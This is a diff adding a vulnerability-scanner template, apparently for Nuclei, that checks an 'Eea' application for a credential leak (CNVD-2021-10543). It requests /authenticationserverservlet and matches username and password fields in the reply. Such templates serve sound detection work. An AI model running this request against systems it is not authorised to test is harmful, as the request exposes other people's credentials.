@@ -1,0 +1,24 @@
+id: eea-info-leak-cnvd-2021-10543
+info:
+  name: Eea Information Leak Vulnerability (CNVD-2021-10543)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: cnvd-2021-10543
+  description: |
+    The Eea application is vulnerable to an information leak that exposes sensitive credentials via an endpoint.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/authenticationserverservlet"
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "<username>(.*?)</username>"
+      - type: regex
+        regex:
+          - "<password>(.*?)</password>"
